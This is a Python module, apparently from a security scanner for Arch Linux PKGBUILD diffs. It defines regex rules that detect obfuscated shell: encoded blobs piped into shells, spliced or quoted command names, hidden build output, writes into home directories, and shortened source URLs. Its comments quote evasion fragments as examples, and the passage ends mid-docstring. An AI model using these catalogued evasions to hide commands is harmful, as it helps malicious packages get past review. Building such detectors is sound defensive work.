"""Crossfire: the evasion technique, not the payload it hides.

Every other family here fires on what a diff *does*. These fire on how it was
*written*. The distinction is not stylistic - it is a response to where the
detection actually failed.

The rules held. The tokenizer that feeds them did not: partial quoting
(``c"u"rl``), array routing (``${A[0]}``), namerefs, and command substitution
(``$(printf '\\x63...')``) all reconstruct an executable name that no pattern
over the resolved text ever sees, because resolution is the step that broke.
Closing each of those in the tokenizer means teaching it to expand more, which
is slow, risky, and trades one bypass for an over-expansion bug.

Crossfire inverts the problem instead. **A word the tokenizer could not
resolve literally is itself the signal.** One rule then covers the evasion
surface of every payload rule at once - R001, H075, H082 and the rest - because
it does not care which payload was being hidden, only that hiding happened.

The failure mode inverts with it. Today a defeated tokenizer produces silence,
which is the worst possible output: the analysis looks clean precisely when it
understood least. Here a defeated tokenizer produces a CRITICAL finding. The
bypass and the alarm become the same event, so cleverness cannot buy quiet.

**What this family is not.** It is not a substitute for fixing the tokenizer,
and it must not become an excuse to stop. A payload written plainly and hidden
by a technique nobody anticipated still gets through; crossfire raises the cost
of evasion, it does not bound it. And it deliberately claims no bytes another
rule already claims: bidi overrides and homoglyphs are absent because
[R013](../../docs/reference/rules/deception.md) is FATAL and already covers
those codepoints, and scoring the same characters twice would corrupt the
calibration the project measures.  X008 exists for the codepoints R013 does
*not* cover - whitespace a shell will not split on - which is a disjoint
set, so it doubles nothing.

Every rule here was measured against the 3,246-diff locked benign corpus
before it was given a weight. The rates are in the reference page; the short
version is that legitimate PKGBUILDs do not do these things.
"""

from __future__ import annotations

import re

from ..config import (
    DECOMPRESSOR as _DECOMPRESSOR,
    NETWORK_CLIENT as _NETWORK_CLIENT,
    SCRIPT_EXECUTOR,
    STRUCTURED_EXTRACTOR as _STRUCTURED_EXTRACTOR,
    OTHER_FETCH_CLIENT as _OTHER_FETCH_CLIENT,
    PACKAGE_MANAGER_INSTALL as _PACKAGE_MANAGER_INSTALL,
)
from ..coverage import note_stage_failure
from ..deps import _strip_comment
from ..tokenizer import split_lines
from ..rules import clamp_text, join_line_continuations

#: Functions makepkg runs, plus the scriptlets pacman runs as root. A
#: technique only matters where something executes.
#:
#: Kept for documentation and for the split-package prefix below; the gate
#: itself is :func:`_executes`, because this list was an allowlist and an
#: allowlist of function names is a rename away from empty.
_EXECUTING_SCOPES = (
    "prepare", "build", "check", "package", "pkgver",
    "post_install", "post_upgrade", "pre_install",
    "pre_upgrade", "pre_remove", "post_remove",
)


#: Files whose every line is shell: the recipe, pacman's scriptlets, and any
#: shell companion the recipe ships. A `.patch` is excluded even though it
#: contains shell-looking text - the text is a payload for `patch`, and the
#: rules that read a patch are H018's, not these.
_SHELL_FILE_RE = re.compile(
    r"(?:^|/)(?:PKGBUILD|[^/]*\.(?:install|sh|bash|zsh))$", re.IGNORECASE
)

_DIFF_TARGET_RE = re.compile(r"^\+\+\+ (?:b/)?(.+?)(?:\t.*)?$")


def _file_at_line(lines: list[str]) -> dict[int, str]:
    """``{line_index: path}`` from the diff's own ``+++`` headers.

    Which file a hunk belongs to decides whether its lines are shell at
    all. Without it the only available gate was "inside a function makepkg
    calls", which is both too narrow (top-level code runs when makepkg
    *sources* the recipe) and too broad (a `.desktop` file's lines are not
    shell in any scope).
    """
    files: dict[int, str] = {}
    current = None
    for index, line in enumerate(lines):
        match = _DIFF_TARGET_RE.match(line)
        if match:
            current = match.group(1).strip()
            continue
        if current is not None:
            files[index] = current
    return files


def _executes(function: str | None) -> bool:
    """Whether code inside *function* runs during a build or install.

    The answer for a PKGBUILD is "yes, wherever it is", and the allowlist
    that used to decide this said no to three shapes that all run:

    * ``package_libfoo()`` - a **split package**. makepkg calls
      ``package_$pkgname()`` for each name in a split recipe, so renaming
      ``package`` to ``package_libfoo`` moved a payload out of range of
      every rule in this family. It is the most common function shape in
      the AUR after the five standard ones.
    * ``_helper()`` - an ordinary helper, called from ``build()``. The name
      is the author's to choose, which is the whole problem with matching
      on it.
    * anything else a recipe defines and calls.

    A function that is *never called* is dead code, and treating dead code
    as executing costs a finding on a package that was already writing
    evasion-shaped shell into a function it does not run. That trade is
    the right way round: the alternative is a rule whose scope the author
    chooses.
    """
    return function is not None

#: A command position: the start of the subject, or just after a separator.
#: The trailing whitespace is *horizontal* on purpose. It used to be `\s*`,
#: which matches a newline, so on a subject holding many of them the engine
#: re-scanned a run of newlines from every position - 8192 of them cost 2.4s
#: in `_SHRED_HOME_RE` and 5.8s in `_HISTORY_WIPE_RE`, quadratic in the line
#: length. Nothing reaches that today, because every caller matches one line
#: at a time and a line holds no newline; it was a loaded gun in a prefix a
#: dozen rules share, and it stayed invisible until the probe alphabet
#: learned to include a newline. A command word follows spaces or tabs on
#: its own line, and the newline boundary is already the lookbehind's job.
_CMD = r"(?:\A|(?<=[;&|(\n])|(?<=&&)|(?<=\|\|)|^)[ \t]*"

# ---------------------------------------------------------------------------
# X001: an encoding decoded straight into a shell.
#
# Base64 is deliberately absent: R003 and R043 claim it at CRITICAL already.
# What is left uncovered is every *other* encoding, and the Atomic Arch second
# wave used hex.
# ---------------------------------------------------------------------------

#: Anything that will execute the bytes it is handed, however it is spelled.
#:
#: The first draft was `sh|bash|zsh|dash|ksh`, which is a list, and a list is
#: a rename away from empty: `ash`, `mksh`, `busybox sh`, `env -S sh` and
#: `python` all took a decoded payload and ran it while this rule said
#: nothing. R001 already knew about `busybox sh` and `source /dev/stdin`,
#: which is the tell that the omission was an oversight rather than a
#: boundary.
#:
#: Interpreters are included deliberately. X001's claim is that an encoding
#: was decoded and then executed; `printf '\x63...' | python3` is that claim
#: exactly, and the escape blob is what makes it so - no recipe pipes a hex
#: blob into an interpreter by accident.
#: The shells alone, without the interpreters: an option cluster like
#: `-lc` is a shell thing, and `python -lc` means nothing.
_SHELL_CMD = r"(?:ba|z|da|k|mk|pdk|ya|po|a)?sh|busybox\s+(?:ash|sh)"

_SHELL_NAME = _SHELL_CMD + r"|python3?|perl|ruby|node"

#: A wrapper may carry its own flags before the executor: `env -i bash`,
#: `env -S sh`, `command -p sh`.
_EXEC_WRAPPER = r"(?:env|exec|command)(?:\s+-[-\w]+)*\s+"

_SHELL = (
    r"(?:/(?:usr/)?bin/)?(?:" + _SHELL_NAME + r")\b"
    r"|" + _EXEC_WRAPPER + r"(?:/(?:usr/)?bin/)?(?:" + _SHELL_NAME + r")\b"
    # `source /dev/stdin` and `. /dev/stdin` read the pipe as a script.
    r"|(?:source|\.)\s+/dev/stdin\b"
)

# The spans between the decoder and the pipe are **possessive** (`*+`), not
# bounded. A `{0,200}` is a bypass for anyone willing to type 201 characters,
# and the bound was there for backtracking safety - which a possessive
# quantifier gives outright, because it never backtracks at all. The
# character class already excludes `|`, so it can never swallow the pipe it
# is looking for.
#: Ways an interpreter turns unreadable bytes into a payload.
#:
#: X001 required the decode to sit inside an `exec(`/`eval(` window, so
#: `python3 -c 'print(b64decode("..."))' | bash` - which decodes and then
#: hands the result to a shell through a pipe, exactly like every other arm
#: of this rule - matched nothing.  The decode call and the destination are
#: now two separate questions, and either destination counts.
_INTERPRETER_DECODE = (
    r"b(?:ase)?64[_.]?decode|b64decode|base64_decode|decode_base64"
    r"|unhexlify|atob|decodestring|Base64\.decode(?:64)?"
    r"|unpack1?\s*\(\s*[\"'](?:m|H\*|u)"
    r"|pack\s*\(\s*[\"']H\*"
    r"|Buffer\.from\s*\([^)]*[\"'](?:base64|hex)[\"']"
    r"|(?:zlib|gzip|bz2|lzma|zstd)\.(?:decompress|decode)"
    r"|Compress::(?:Zlib|Raw)|Inflate|uncompress"
    r"|codecs\.decode|binascii\.[ab]2[ab]_"
)


X001_RE = re.compile(
    # Every pipe here must be operative: an escaped bar hands the decoded
    # bytes to the command as an argument and starts no shell.  Same guard
    # as R001-R003 and R045, and the reason the tokenizer keeps `\|` intact.
    #
    # A hex or octal escape blob piped into a shell.
    # The blob is asserted by a lookahead rather than searched for by a
    # span that gives ground one character at a time: with many blobs and
    # no pipe, that retried the tail from every one of them and measured
    # quadratic. The lookahead runs once, and the span to the pipe is
    # possessive.
    r"(?:printf|echo\s+-e|/bin/echo\s+-e)"
    r"(?=[^\n|;&]*(?:\\x[0-9a-fA-F]{2}|\\[0-7]{3}))"
    r"[^\n|;&]*+(?<!\\\\)\|\s*(?:" + _SHELL + r")|"
    # A hex dump reversed and piped into a shell.
    r"\b(?:xxd\s+-r|od\b(?=[^\n|;&]*\s-A)|hexdump)\b[^\n|;&]*+(?<!\\\\)\|\s*(?:" + _SHELL + r")|"
    # The decoders that are not `base64`. R003 and R043 claim that one
    # spelling; `base32 -d`, `openssl enc -d` and `uudecode` decode the same
    # payload into the same shell and were claimed by nobody.
    # `basenc --base64url -d` and `basenc -d --base64url` are the same
    # command.  Requiring the algorithm first made the flag order a pure
    # spelling escape, so the span is order-free and only asserts that a
    # decode flag is present somewhere in the command.
    r"\b(?:base32\s+-d|basenc\b(?=[^\n|;&]*\s-d\b)[^\n|;&]*?\s-d|uudecode"
    # `openssl zlib -d` decodes as surely as `openssl enc -d`, and
    # `certutil -decode` is the same operation with a different binary.
    r"|openssl\s+(?:zlib|base64)\b(?=[^\n|;&]*\s-d)[^\n|;&]*?\s-d"
    r"|certutil\b[^\n|;&]*?-decode"
    r"|openssl\s+enc\b(?=[^\n|;&]*\s-d)[^\n|;&]*?\s-d)\b"
    r"[^\n|;&]*+(?<!\\\\)\|\s*(?:" + _SHELL + r")|"
    # A *compressed* blob decompressed straight into a shell.  Same shape as
    # the arm above and with less work for the attacker: no encoder, no
    # alphabet, and a `.gz` carried in `source=()` reads as an ordinary
    # archive.  `gzip -dc payload.gz | bash` intersected no rule at all.
    r"(?:" + _DECOMPRESSOR + r")[^\n|;&]*+(?<!\\)\|\s*(?:" + _SHELL + r")|"
    # An interpreter one-liner that decodes and executes in the same
    # expression.  There is no pipe for the arms above to anchor on and no
    # shell word for X002 to read: the decode and the exec are both inside
    # the quoted script, which is the whole point of writing it this way.
    # Flags may precede the script flag: `perl -MMIME::Base64 -e '...'` is
    # the natural spelling, and anchoring on the interpreter's *next* token
    # would have made the module import an escape.
    r"\b(?:python[23]?|perl|ruby|node|php|lua)\s+(?:-\S++\s++)*?-[ceEr]\b"
    r"(?=[^\n]*(?:" + _INTERPRETER_DECODE + r"))"
    r"[^\n]*?"
    r"(?:(?:exec|eval|Function|system|popen|compile|require)\s*\("
    r"|(?<!\\)\|\s*(?:" + _SHELL + r"))|"
    # A value pulled out of a structured file and handed to a shell.  Same
    # shape as the decoder arms, with a query in place of an algorithm: the
    # field is in a JSON or YAML file no rule reads, so what executes is
    # chosen by the data rather than written in the recipe.
    r"(?:" + _STRUCTURED_EXTRACTOR + r")[^\n|;&]*+(?<!\\)\|\s*(?:" + _SHELL + r")|"
    # An ANSI-C quoted blob executed via eval or a shell.
    r"\b(?:eval|" + _SHELL + r")\s+\$'(?:\\x[0-9a-fA-F]{2}|\\[0-7]{3}){3,}|"
    # tr-based rotation (ROT13 and friends) fed to a shell.
    r"\btr\s+[^\n|;&]*+(?<!\\\\)\|\s*(?:" + _SHELL + r")",
    re.IGNORECASE,
)

# ---------------------------------------------------------------------------
# X002: the executable name is not a literal.
#
# The one that pays for the family. Zero hits on the benign corpus, and it
# catches every tokenizer bypass found so far, because each of them works by
# assembling a command name the parser cannot read.
# ---------------------------------------------------------------------------

# An assignment is not a command: `font=$(grep ...)` names no executable, and
# the corpus's only near-misses were exactly that shape.
_ASSIGNMENT_RE = re.compile(r"^[A-Za-z_][A-Za-z0-9_]*(?:\[[^\]]{0,40}\])?\+?=")

# Markdown fences and prose survive into diffs of README-ish files.
_FENCE_RE = re.compile(r"^\s*(?:```|~~~|#|//|\*|-\s)")

def _confusable_class() -> str:
    """The confusable characters, as a regex character class.

    Reuses the curated map rather than a second list: a character that
    impersonates ASCII is the same set whether it appears in a domain
    (R013b) or in a command name.
    """
    from ..buckets import _CONFUSABLE_TO_LATIN

    return "".join(re.escape(ch) for ch in sorted(_CONFUSABLE_TO_LATIN))


_CONFUSABLE_CHARS = _confusable_class()


X002_SHAPES = (
    # ${A[0]}, $cmd, ${!ref} - a variable in command position.
    #
    # The word must *be* the variable, or continue into more name
    # characters (`${D}url` assembles a name). A `/` after it means the
    # variable named a directory and the executable is spelled out:
    # `"$srcdir/calibre-release/calibre-debug"` hides nothing, and matching
    # it made X002 fire CRITICAL on ordinary in-tree test invocations.
    # Three spellings, because a `/` means opposite things on the two
    # sides of a brace.
    #
    # Inside `${...}` it is parameter expansion, and any operator there is
    # assembling a name: `${c//X/}` turns `XurlX` into `curl`, which is a
    # bypass this family has to hold. Outside, it is a path separator, and
    # `"$srcdir/calibre-release/calibre-debug"` names its executable in
    # plain text - the directory came from a variable and nothing is
    # hidden. Matching that made X002 fire CRITICAL on ordinary in-tree
    # test invocations.
    #
    # The `(?![A-Za-z0-9_])` on the bare form is load-bearing: without it
    # the name could match a *prefix* and the "continues into more name
    # characters" alternative would match the rest of its own name, so
    # `"${pkgdir}/etc/x.conf"` read as `${pkgdi}` + `r`.
    ("variable", re.compile(
        # ${!ref} - indirect expansion is assembly by definition.
        r"^[\"']?\$\{!"
        # ${A[0]}, ${c//X/}, ${c,,}, ${a[@]:0:1} - an operator inside.
        # The name is maximal here too, or `${srcdir}/x` matches as
        # `${srcdi` + `r` + `}`, which is the same prefix backtrack again.
        r"|^[\"']?\$\{[A-Za-z_][A-Za-z0-9_]*(?![A-Za-z0-9_])[^}\s]+\}"
        # $cmd, ${cmd}, ${D}url - the word is the variable, or grows a name.
        r"|^[\"']?\$\{?[A-Za-z_][A-Za-z0-9_]*(?![A-Za-z0-9_])\}?"
        r"(?:[\"']?$|[A-Za-z0-9_.-])")),
    # ba${x}sh - the expansion is spliced into the *middle* of the word.
    #
    # Every shape above anchors the variable at the start, so `${D}url` was
    # claimed and `ba${x}sh` was not - and this is the one word-splitting
    # spelling that actually runs: bash expands an unset or empty `x` to
    # nothing and executes `bash`. (The invisible-codepoint spellings of the
    # same idea - `ba<TAB>sh`, `ba<U+3164>sh` - do not run at all; they are
    # "command not found", which is why they are X008's deception problem
    # rather than an execution one.)
    #
    # Name characters are required on *both* sides. A `/` before the
    # expansion means a path, and `"$srcdir/calibre-release/calibre-debug"`
    # names its executable in plain text - the FP this family already
    # documents.
    ("spliced-variable", re.compile(
        r"^[\"']?[A-Za-z0-9_]+\$\{?[A-Za-z_][A-Za-z0-9_]*\}?[A-Za-z0-9_]")),
    # $(...) or `...` producing the command name.
    ("substitution", re.compile(r"^[\"']?(?:\$\(|`)")),
    # c"u"rl, c'u'rl - quotes inside a word the shell then joins.
    #
    # Possessive and unbounded: the quoted span used to be capped at 40
    # characters, so `c"uuu...45 of them...u"rl` was the same evasion with
    # padding. The class excludes both quotes, so `*+` cannot swallow the
    # closing one.
    ("partial-quote", re.compile(
        r"^[A-Za-z0-9_./-]*+[\"'][^\"']*+[\"'][A-Za-z0-9_./-]")),
    # $'\x63\x75\x72\x6c' - an ANSI-C string as the command.
    ("ansi-c", re.compile(r"^\$'")),
    # cur{l,} - brace expansion assembling the name. Not `${...}`, which the
    # variable shape above already claims.
    # Unbounded: 61 characters inside the braces used to be enough to walk
    # past this. The separator is asserted by a lookahead and the span to
    # the closing brace is possessive, which keeps the whole thing linear -
    # a plain `[^}]*(?:,|\.\.)[^}]*\}` re-scans from every position and
    # measured quadratic, and trading a length bypass for a quadratic is no
    # trade at all.
    ("brace-expansion", re.compile(
        r"^(?!\$)[^\s{}]*\{(?=[^}]*(?:,|\.\.))[^}]*+\}")),
    # A character that *impersonates* an ASCII letter: `\u0441url` reads as
    # `curl` and is not it. Deliberately not "any non-ASCII" - that fired on
    # ordinary English prose carrying a typographic apostrophe, which
    # impersonates nothing and names no command. The curated map from
    # `buckets` is the same one R013b uses for domains.
    # Unbounded: a command word with the confusable past character 60 used
    # to read as clean. Anchored, so there is one start position and the
    # scan is linear in the word.
    ("homoglyph", re.compile(r"^[^\s]*[" + _CONFUSABLE_CHARS + r"]")),
    # `/usr/bin/c?rl` and `/usr/bin/cur[l]` are the shell's own spelling
    # game: the word in the diff is not the name of any program, and the
    # name that runs is whatever the glob finds on disk at build time.
    # Every other shape here answers "the reader cannot tell what runs from
    # the text", and a glob answers it the same way - it was simply not on
    # the list.
    #
    # A glob is only assembly when it is spelled inside a *program name*.
    # `rm -rf build/*.o` and `for f in *.sh` put it in an argument, which
    # is where globs ordinarily live, and the command-word position this
    # tuple is matched against already excludes those.
    ("glob", re.compile(
        # A path-shaped word: the glob is inside a component, not the
        # whole component, so `/usr/bin/*` (a directory listing, not a
        # program) does not match while `/usr/bin/c?rl` does.
        # At least one name character before the metacharacter. Without
        # it the shape matched `[` - the test builtin, which is a command
        # word in every `if [ -f x ]` in the ecosystem - and fired on 48
        # benign packages whose only crime is an `if` statement.
        r"^[\"']?/?(?:[\w.+-]+/)*[\w.+-]+[?*\[][\w.+\-?*\]\[]*$"
    )),
    # There is deliberately no `escaped-character` shape for `c\url`.
    #
    # It was added here first, because the tokenizer kept the backslash and
    # the name never reconstructed - so that spelling reached no rule at
    # all, R001 included, and this family was the only thing standing under
    # it. The tokenizer now removes the escape
    # (`tokenizer._ESCAPE_REMOVABLE`), which is the actual fix: every rule
    # that reads a command name sees `curl` again, not just this one.
    #
    # With the name resolved, claiming it here would score one command
    # twice - the same reason `curl""` has no shape either, and the same
    # reason R013's codepoints are not re-scored here. This module's own warning is
    # that it must not become an excuse to stop fixing the tokenizer; a
    # shape retired because the tokenizer caught up is that working.
)

_FIRST_WORD_RE = re.compile(r"^\s*([^\s;&|<>]+)")


# ---------------------------------------------------------------------------
# X003: the argument is obfuscated rather than the command.
# ---------------------------------------------------------------------------

X003_SHAPES = (
    # curl/wget long options cut to a unique prefix: --upload-f for
    # --upload-file. Legitimate recipes spell options out.
    ("truncated-option", re.compile(
        r"\b(?:curl|wget)\b[^\n|;&]*?\s--(?:upload-f|dat|outp|hea|loca|"
        r"inse|conf|remote-na|post-f)[a-z]*(?=\s|$)")),
    # A shell invoked with its options stuffed together: bash -lc, sh -ec.
    # `sh -c` is ordinary; `sh -lc` / `bash -ec` stuffs extra options around
    # -c, which is how a payload gets a login shell or error suppression
    # without a second command.
    #
    # The `c` may sit anywhere in the cluster - `sh -ce` and `bash -cl` are
    # the same instruction as `-ec` and `-lc`, and requiring it last let
    # both through. The cluster must hold at least two letters, which is
    # what keeps an ordinary `sh -c` out.
    #
    # The shell list is the one X001 uses, minus its interpreters: `ash -lc`
    # and `mksh -lc` stuff options exactly as `sh` does, and a list that
    # names five of a dozen shells is a rename away from empty.
    ("option-stuffing", re.compile(
        r"\b(?:" + _SHELL_CMD + r")\s+-(?=[a-z]*c)[a-z]{2,}(?=\s|$)")),
    # An IP written in octal, hex or as a single integer, inside a URL.
    # IGNORECASE for the scheme: RFC 3986 makes it case-insensitive and
    # curl accepts `HTTP://`, so a shift key was a way past this shape.
    ("encoded-host", re.compile(
        r"https?://(?:0\d{1,3}\.[0-9.]{1,15}|0x[0-9a-fA-F]{2,8}(?:\.|/|:)|\d{8,10}(?:/|:|$))",
        re.IGNORECASE)),
)

# ---------------------------------------------------------------------------
# X004: the build hides its own output.
#
# Bare `2>/dev/null` is excluded: it is ordinary defensive shell and fires on
# 0.481% of the benign corpus, which is small but is noise rather than signal.
# The three forms kept fire on zero.
# ---------------------------------------------------------------------------

X004_SHAPES = (
    # The value may be quoted: `TERM='dumb'` sets exactly what `TERM=dumb`
    # does, and matching only the bare spelling let a quote past.
    ("term-dumb", re.compile(r"\bTERM\s*=\s*[\"']?dumb\b")),
    # `set +x` and its long spelling. `set +o xtrace` is the same
    # instruction and used to walk past the short form's pattern, which
    # required the `x` to end the option cluster - so `set +vx` was caught
    # and `set +xv` was not, on nothing but letter order.
    ("trace-off", re.compile(
        _CMD + r"set\s+(?:\+[a-z]*x[a-z]*(?=\s|;|$)|\+o\s+(?:xtrace|verbose)\b)",
        re.MULTILINE)),
    # Every redirection that detaches the stream, not just the truncating
    # one: `exec 2>>/dev/null` appends and `exec &>/dev/null` takes both
    # streams, and both were silent.
    ("stderr-detached", re.compile(
        r"\bexec\s+(?:&|\d)?>>?\s*(?:/dev/null|&-)")),
)

# ---------------------------------------------------------------------------
# X005: the home directory, reached by a spelling that dodges the check.
#
# H032 claims a write whose target starts with `~/` or `$HOME/`, plus any
# rc-file basename. That is the obvious spelling, and it is the one an
# attacker will not use. The same directory is reachable as
# `/home/alice/...`, `~alice/...`, `/root/...`, `/home/$USER/...`,
# `${HOME:-/home/alice}/...`, or by traversing into it - and none of those
# start with the prefix H032 looks for.
#
# This is the family's thesis applied to a path: the technique is the signal.
# Choosing `/home/$USER/bin` over `$HOME/bin` is a choice, and the only thing
# it buys is getting past a check.
#
# It **defers** to H032 rather than doubling it: a target H032 already claims
# is skipped here, so one write is scored once.
# ---------------------------------------------------------------------------

#: What H032 already matches.  X005 stands down on these.
_H032_CLAIMS_RE = re.compile(r"^[\"']?(?:~|\$\{?HOME\}?)/")

_HOME_ALIASES = (
    # A literal home path, with a real or variable username.
    # `/home//alice/` reaches the same directory; a single slash in the
    # pattern was an evasion.
    #
    # The trailing slash is optional, and that was an evasion too: `cp
    # payload /home/alice` writes into the same directory as `/home/alice/`
    # and every one of these patterns required the separator. The path must
    # still *end* there - a bare `/home` with nothing after it names the
    # parent of all homes, which packaging touches legitimately.
    ("literal-home", re.compile(
        r"(?:^|[\s\"'=])/home/+(?:\$\{?\w+\}?|[A-Za-z0-9._-]+)(?:/|[\s\"']|$)")),
    # Tilde-user expansion: ~alice/ is $HOME for alice, and dodges `^~/`.
    ("tilde-user", re.compile(r"(?:^|[\s\"'=])~[A-Za-z0-9._-]+(?:/|[\s\"']|$)")),
    # root's home.
    ("root-home", re.compile(r"(?:^|[\s\"'=])/root(?:/|[\s\"']|$)")),
    # A default-value expansion that names a home path if HOME is unset.
    # Unbounded: 81 characters of default value walked past this.
    ("home-default", re.compile(r"\$\{HOME[:-][=+-][^}]*+\}")),
    # Traversal that explicitly aims at a home directory.
    ("traversal-home", re.compile(r"(?:\.\./){1,8}(?:home|root)/")),
)

#: The write, allowing the same prefixes X002 walks past: an assignment or
#: a wrapper before `cp` does not stop it being a copy.
_WRITE_PREFIX = r"(?:[A-Za-z_]\w*=\S*\s+|(?:env|sudo|doas|exec|nohup|command|timeout|nice)\s+)*"

_WRITE_COMMAND_RE = re.compile(
    _CMD + _WRITE_PREFIX +
    r"(?:install|cp|mv|tee|ln|mkdir|touch|rsync|dd|chmod|chown|sed)\b|"
    r">>?\s*[\"']?(?=\S)",
    re.MULTILINE,
)

#: makepkg's staging roots.  `$pkgdir/home/...` is packaging, not a write to
#: anybody's home.
#:
#: Case-sensitive, because makepkg's variables are: `$PKGDIR` is not a
#: staging root, it is an unset variable that expands to nothing, and
#: `install -Dm644 x "$PKGDIR/../../home/alice/.bashrc"` writes into a home
#: directory while claiming the exemption. Matching it case-insensitively
#: handed an attacker the way out for the price of a shift key.
_STAGED_RE = re.compile(r"\$\{?(?:pkgdir|srcdir|builddir|startdir)\}?")


def _word_around(body: str, start: int, end: int) -> str:
    """The whitespace-delimited word containing ``body[start:end]``."""
    left = start
    while left > 0 and not body[left - 1].isspace():
        left -= 1
    right = end
    while right < len(body) and not body[right].isspace():
        right += 1
    return body[left:right]


def _home_alias_hit(body: str):
    """The alias shape this line uses to reach a home directory, or None."""
    if not _WRITE_COMMAND_RE.search(body):
        return None
    for shape, pattern in _HOME_ALIASES:
        match = pattern.search(body)
        if not match:
            continue
        # The staging exemption belongs to the *target*, not to the line.
        # It used to be tested against the whole body, so a decoy anywhere
        # on the line bought silence: `echo "$pkgdir" && cp payload
        # /home/alice/.bashrc` reported nothing. What makes a write
        # packaging is that the path being written is under a staging root,
        # which is a property of that one word.
        # The alias match opens with its boundary character - a space, a
        # quote or an `=` - so expanding from `match.start()` walks
        # backwards into the *previous* argument, and `cp "$pkgdir/x"
        # /home/alice/.bashrc` read as one staged word. Start at the path.
        matched = match.group(0)
        path_start = match.start() + len(matched) - len(matched.lstrip(" \t\"'="))
        target_word = _word_around(body, path_start, match.end())
        if _STAGED_RE.search(target_word):
            continue
        # Defer to H032 when the target is spelled the plain way.
        target = match.group(0).lstrip(" \t\"'=")
        if _H032_CLAIMS_RE.match(target):
            continue
        return shape
    return None


# ---------------------------------------------------------------------------
# X006: the source points somewhere unexpected.
#
# Domain reputation and upstream-owner matching are deliberately absent: the
# novelty tier already scores a globally-first-seen URL, and an owner
# heuristic is too brittle for a decentralised repository. What is left is the
# two forms that are never legitimate in a source array.
# ---------------------------------------------------------------------------

X006_SHAPES = (
    ("url-shortener", re.compile(
        r"https?://(?:bit\.ly|tinyurl\.com|t\.co|goo\.gl|is\.gd|ow\.ly|rb\.gy|"
        r"cutt\.ly|shorturl\.at|s\.id|rebrand\.ly)/", re.IGNORECASE)),
    # As above: the shortener shape beside this one was already
    # case-insensitive, which is what made the inconsistency an accident
    # rather than a decision.
    ("raw-ip-source", re.compile(
        r"https?://\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}(?::\d+)?(?:/|$)",
        re.IGNORECASE)),
)




# ---------------------------------------------------------------------------
# X008: whitespace that a shell does not treat as whitespace.
#
# bash splits words on space, tab and newline. Python's `\s` also matches
# NBSP, NNBSP, the ogham and ideographic spaces, NEL and the line/paragraph
# separators - so a line reading `make install` with a NBSP between the two
# words *displays* as a command and *executes* as the single unknown word
# `make install`. What the reader reviews is not what the shell runs.
#
# This is R013's argument applied to a disjoint set of codepoints. R013 is
# FATAL and covers bidi overrides, zero-width characters and tag characters;
# it does not cover these, so nothing scored them and nothing reported them.
# A payload rule that mentions `\s` fires *around* one - R001 reports "curl
# piped to bash" for a line that runs no curl - which describes the wrong
# thing rather than nothing.
#
# MEDIUM, not FATAL: the line fails closed (the command is simply not found)
# and the realistic benign cause is a command copy-pasted from a web page.
# It is worth reporting and not worth flagging on its own.
_DECEPTIVE_SPACE_RE = re.compile(r"[^\S \t\n\r]")


def _split_commands(body: str) -> list[str]:
    """Split *body* on command separators, respecting quotes.

    A `|` inside a quoted argument does not start a command:
    ``sed -i 's|"$LIBS -lfoo|...|'`` is one command, and splitting naively
    on the pipe offered ``"$LIBS ...`` as a command word. That was the only
    substitution-shaped false positive the benign corpus produced.
    """
    parts, current, quote = [], [], None
    depth = 0
    index = 0
    while index < len(body):
        ch = body[index]
        if quote:
            if ch == quote:
                quote = None
            current.append(ch)
        elif ch in "'\"":
            quote = ch
            current.append(ch)
        elif ch == "[" and body[index:index + 2] == "[[":
            # `[[ -n "$a" && "$a" != "$b" ]]` is one test, not two commands.
            # Splitting on the `&&` handed the second half to the scan with
            # `"$a"` in first position, and a conditional that mentions a
            # variable is most of the shell ever written. The guard at the
            # top of the loop only sees a part that *begins* with `[[`.
            depth += 1
            current.append(body[index:index + 2])
            index += 2
            continue
        elif ch == "]" and body[index:index + 2] == "]]":
            depth = max(0, depth - 1)
            current.append(body[index:index + 2])
            index += 2
            continue
        elif ch == "(":
            depth += 1
            current.append(ch)
        elif ch == ")":
            depth = max(0, depth - 1)
            current.append(ch)
        elif ch in ";&|" and depth == 0:
            parts.append("".join(current))
            current = []
            # Consume the second character of && and ||.
            if index + 1 < len(body) and body[index + 1] == ch:
                index += 1
        elif ch in ";&|":
            # Inside `(( ... && ... ))` or `$( ... )` this is arithmetic or a
            # nested pipeline, not a new command.
            current.append(ch)
        else:
            current.append(ch)
        index += 1
    parts.append("".join(current))
    return parts


#: Commands that run another command, so the *next* word is the real one.
#: An attacker who writes `env ${A[0]} ...` has still routed the name through
#: an array; the wrapper only moves it one token to the right.
#:
#: ``eval`` is deliberately absent. It runs another command like the rest,
#: but R039 already claims eval-of-dynamic-content, and this family's own
#: rule is that it never scores bytes another rule scores - the reason
#: does not exist beside R013. Treating it as a wrapper made X002 fire a
#: second CRITICAL on `eval "$(updpkgsrcs ...)"`, which was both benign and
#: already R039's.
#:
#: ``if``/``elif``/``while``/``until`` are here for the opposite reason:
#: each takes a *command* whose exit status it tests, so `if ${A[0]} x;
#: then` runs the array-routed name exactly as `${A[0]} x` does, and the
#: scan used to stop at the keyword and never look. ``for`` is not here -
#: the word after it is a loop variable, not a command.
_WRAPPERS = frozenset({
    "env", "exec", "sudo", "doas", "nohup", "command", "builtin", "time",
    "nice", "ionice", "timeout", "xargs", "setsid", "stdbuf", "unbuffer",
    "script", "then", "else", "do", "!",
    "if", "elif", "while", "until",
})

#: A redirection can precede the command: `>out ${A[0]} x`.
_REDIRECT_RE = re.compile(r"^\d?[<>]")

#: An expression context: nothing inside names a command.
_EVALUATION_RE = re.compile(r"^(?:\(\(|\[\[|\[\s|test\s)")

#: A number is an argument to a wrapper (`timeout 5 cmd`), not a command.
_NUMERIC_RE = re.compile(r"^\d+$")


def _opens_a_value(token: str) -> bool:
    """True when *token* leaves a quote or a substitution unclosed.

    `FOO=1 cmd` is an environment prefix and the scan must walk past it to
    reach `cmd`. `outmsg=$(eval "$(...)" 2>&1)` is not: everything after the
    first token is the assignment's *value*, and reading on found the `$(`
    inside it and called it a command name. The two are told apart by
    whether the token closes what it opened.
    """
    return bool(
        token.count('"') % 2
        or token.count("'") % 2
        or token.count("(") > token.count(")")
    )


def _command_words(body: str, resolvable: frozenset[str] = frozenset()):
    """Each command-position word on *body* that is not a literal.

    A command word is not always the first token. Every one of these hides
    it one or more tokens to the right, and each was an evasion of an
    earlier version of this rule:

    * an environment assignment - `FOO=1 ${A[0]} x`
    * a wrapper command - `env`, `exec`, `sudo`, `nohup`, `timeout 5`
    * a redirection - `>out ${A[0]} x`
    * a subshell or group opener - `( ${A[0]} x )`

    So the scan skips prefixes rather than reading position zero. What it
